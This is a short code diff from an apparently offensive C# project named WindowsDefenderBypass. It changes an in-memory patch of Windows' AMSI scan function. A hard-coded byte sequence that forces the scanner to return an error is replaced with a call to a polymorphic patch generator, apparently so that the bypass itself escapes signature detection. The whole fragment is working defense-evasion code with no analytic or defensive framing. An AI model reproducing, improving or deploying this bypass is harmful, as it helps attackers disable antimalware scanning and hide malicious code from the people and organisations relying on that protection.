@@ -23,7 +23,7 @@ namespace WindowsDefenderBypass
                     return;
                 }
 
-                byte[] patch = { 0x31, 0xC0, 0x05, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                byte[] patch = PolymorphicPatchGenerator.GenerateAmsiPatch();
 
                 uint oldProtect;
                 if (NativeMethods.VirtualProtect(asbAddr, (UIntPtr)patch.Length, NativeMethods.PAGE_EXECUTE_READWRITE, out oldProtect))
